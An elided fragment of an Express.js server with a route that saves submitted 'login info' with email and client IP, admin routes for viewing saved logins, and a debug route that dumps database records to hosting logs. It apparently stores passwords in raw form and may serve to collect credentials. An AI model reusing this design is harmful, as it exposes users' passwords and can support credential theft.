...
// ----- Helper: get client IP (works behind proxy/load balancer) -----
function getClientIp(req){
  return (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
}

// ----- Routes -----
// Save login info (from website)
app.post('/save-login', async (req, res) => {
  ...
  try {
    ...
    // Console log a compact line for Live Tail (avoid logging raw password widely)
    console.log(`[LOGIN SAVED] ${new Date().toISOString()} id=${doc._id} email=${email} ip=${ip}`);
...
// View saved logins (admin only via token)
...
// View saved applications (admin only)
...
// Debug route: prints DB docs to Render logs (not public)
